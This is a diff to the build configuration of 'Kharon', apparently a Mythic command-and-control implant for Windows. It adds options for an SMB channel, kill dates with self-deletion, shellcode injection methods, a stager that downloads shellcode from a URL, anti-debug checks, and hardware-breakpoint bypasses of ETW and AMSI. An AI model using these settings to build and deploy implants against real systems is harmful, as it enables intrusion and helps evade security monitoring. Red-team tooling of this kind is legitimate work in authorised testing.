@@ -15,83 +15,153 @@ class KharonAgent( PayloadType ):
     supported_os     = [SupportedOS.Windows];
     wrapper          = False;
     wrapped_payloads = [];
-    note             = """Kharon agent. Version: v0.0.1"""
+    note             = \
+    """
+    Kharon agent. Version: v0.0.1
+    """
     supports_dynamic_loading = False;
-    c2_profiles      = ["http"];
+    c2_profiles      = ["http", "smb"];
     translation_container = "KharonTranslator";
-
     build_parameters = [
+        BuildParameter(
+            name           = "Killdate",
+            parameter_type = BuildParameterType.Date,
+            description    = "1.10 - [AGENT] date to kill the agent",
+        ),
+        BuildParameter(
+            name           = "Self Delete",
+            parameter_type = BuildParameterType.Boolean,
+            description    = "1.11 - [AGENT] self deletion in kill date routine",
+        ),
+        BuildParameter(
+            name           = "Exit Method",
+            parameter_type = BuildParameterType.ChooseOne,
+            choices        = ["process", "thread"],
+            description    = "1.12 - [AGENT] exit method to kill date routine",
+        ),
         BuildParameter(
             name           = "Spawnto",
             parameter_type = BuildParameterType.String,
             default_value  = "C:\\Windows\\System32\\notepad.exe",
-            description    ="used to fork and run routines",
+            description    = "1.01 - [AGENT] used to fork and run routines",
         ),
         BuildParameter(
             name            = "Architecture",
             parameter_type  = BuildParameterType.ChooseOne,
-            choices         = [ "x64", "x86"],
+            choices         = ["x64", "x86"],
             default_value   = "x64",
-            description     = "architecture to compile agent",
+            description     = "0.03 - architecture to compile",
+        ),
+        BuildParameter(
+            name            = "BOF Hook",
+            parameter_type  = BuildParameterType.Boolean,
+            default_value   = False,
+            description     = "1.09 - [AGENT] beacon object file hooks",
         ),
         BuildParameter(
             name            = "Injection Shellcode",
             parameter_type  = BuildParameterType.ChooseOne,
-            choices         = [ "classic"],
+            choices         = ["classic", "stomp"],
             default_value   = "classic",
-            description     = "technique used to injection shellcode in memory",
+            description     = "1.02 - [AGENT] technique used to injection shellcode in memory",
         ),
         BuildParameter(
             name            = "Injection PE",
             parameter_type  = BuildParameterType.ChooseOne,
-            choices         = [ "reflection"],
+            choices         = ["reflection"],
             default_value   = "reflection",
-            description     = "technique used to injection PE in memory",
+            description     = "1.03 - [AGENT] technique used to injection PE in memory",
         ),
         BuildParameter(
             name            = "Mask",
             parameter_type  = BuildParameterType.ChooseOne,
-            choices         = [ "timer", "none"],
+            choices         = ["timer", "none"],
             default_value   = "none",
-            description     = "technique to beacon obfuscate in memory during sleep",
+            description     = "1.04 - [AGENT] technique to beacon obfuscate in memory during sleep",
         ),
         BuildParameter(
             name            = "Heap Mask",
             parameter_type  = BuildParameterType.Boolean,
             default_value   = "false",
-            description     = "obfuscate the heap during sleep (note: a mask value other than \"none\" is required).",
+            description     = "1.05 - [AGENT] obfuscate the heap during sleep.",
         ),
         BuildParameter(
             name            = "Indirect Syscall",
             parameter_type  = BuildParameterType.Boolean,
             default_value   = "false",
-            description     = "use indirect syscalls",
+            description     = "1.06 - [AGENT] use indirect syscalls",
         ),
         BuildParameter(
             name            = "Hardware Breakpoint",
-            parameter_type  = BuildParameterType.Boolean,
-            default_value   = "false",
-            description     = "use hardware breakpoint to bypass etw/amsi",
+            parameter_type  = BuildParameterType.ChooseOne,
+            choices         = ["etw", "amsi", "all", "none"],
+            default_value   = "none",
+            description     = "1.07 - [AGENT] use hardware breakpoint to bypass etw/amsi",
         ),
         BuildParameter(
             name            = "Call Stack Spoofing",
             parameter_type  = BuildParameterType.Boolean,
             default_value   = "false",
-            description     = "spoof the call stack of the specifieds winapis",
+            description     = "1.08 - [AGENT] spoof the call stack of the specifieds winapis",
         ),
         BuildParameter(
             name            = "Format",
             parameter_type  = BuildParameterType.ChooseOne,
             choices         = [ "exe", "dll", "svc", "bin"],
             default_value   = "bin",
-            description     = "executable (.exe), dynamic linked library (.dll), service executable (.svc.exe) and shellcode (.bin)",
+            description     = "0.02 [GLOBAL] - executable (.exe), dynamic linked library (.dll), service executable (.svc.exe) and shellcode (.bin)",
         ),
         BuildParameter(
             name            = "Debug",
             parameter_type  = BuildParameterType.Boolean,
             default_value   = "false",
-            description     = "generate an agent with debug strings. The debug output is handled using DbgPrint and can be viewed in a debugger",
-        )
+            description     = "0.01 [GLOBAL] - generate with debug strings. The debug output is handled using DbgPrint and can be viewed in a debugger",
+        ),
+        BuildParameter(
+            name            = "Method",
+            parameter_type  = BuildParameterType.ChooseOne,            
+            description     = "2.00 - [LOADER] Method to use shellcode",
+            choices         = ["stager", "stageless"],
+        ),
+        BuildParameter(
+            name            = "Stageless",
+            parameter_type  = BuildParameterType.ChooseOne,            
+            choices         = [".text", ".data"],
+            description     = "2.01 - [LOADER] Section to storage the shellcode",
+        ),
+        BuildParameter(
+            name            = "Stager",
+            parameter_type  = BuildParameterType.Dictionary,            
+            description     = "2.02 - [LOADER] the stager options (first choice is url, second is user-agent and you can create the additional header for the request)",
+            dictionary_choices=[
+                DictionaryChoice(name="url", default_value="https://localhost.com/shellcode.bin", default_show=True),
+                DictionaryChoice(name="user-agent", default_show=True, default_value="mozilla"),
+            ],
+        ),
+        BuildParameter(
+            name            = "Anti-Debug",
+            parameter_type  = BuildParameterType.Boolean,
+            default_value   = "false",
+            description     = "2.03 [LOADER] - use anti-debug technique to avoid to debug",
+        ),
+        BuildParameter(
+            name            = "IP White List",
+            parameter_type  = BuildParameterType.Boolean,
+            default_value   = "false",
+            description     = "2.04 [LOADER] - execute the payload only if there are no other instances running on the current machine (use mutex to know this)",
+        ),
+        BuildParameter(
+            name            = "Domain Joined",
+            parameter_type  = BuildParameterType.Array,
+            default_value   = ["none"],
+            description     = "2.05 [LOADER] Use 'none' to allow execution on any domain-joined machine. To restrict execution to specific domain(s), list them and enable the block",
+        ),
+        BuildParameter(
+            name            = "Control Run",
+            parameter_type  = BuildParameterType.Boolean,
+            default_value   = "false",
+            description     = "2.06 - [LOADER] execute the payload only if there are no other instances running on the current machine (use mutex to know this)",
+        ),
     ]
 
     AgentPath = pathlib.Path(".") / "Kharon";
@@ -224,10 +294,14 @@ class KharonAgent( PayloadType ):
         if Config["ssl"] is True:
             Secure = 1;
         
-        if HardBreak is True:
-            HardBreak = 1
-        else:
-            HardBreak = 0
+        if HardBreak == "etw":
+            HardBreak = 0x400
+        elif HardBreak == "amsi":
+            HardBreak = 0x700
+        elif HardBreak == "all":
+            HardBreak = 0x100
+        elif HardBreak == "none":
+            HardBreak = 0x000
 
         if Syscalls is True:
             Syscalls = 1
@@ -244,7 +318,7 @@ class KharonAgent( PayloadType ):
             "InjPE"     : f"KH_INJECTION_PE={InjectionPE[InjPE]}",
             "HeapMask"  : f"KH_HEAP_MASK={HeapMask}",
             "Syscall"   : f"KH_INDIRECT_SYSCALL_ENABLED={Syscalls}",
-            "Hwbp"      : f"KH_HARDWARE_BREAKPOINT_ENABLED={HardBreak}",
+            "Hwbp"      : f"KH_HARDWARE_BREAKPOINT_BYPASS_DOTNET={HardBreak}",
             "Spawntox64": f"KH_SPAWNTO_X64={Spawntox64}",
             "uuid"      : f"KH_AGENT_UUID={Config['payload_uuid']}",
             "web-port"  : f"WEB_PORT={Config['callback_port']}",
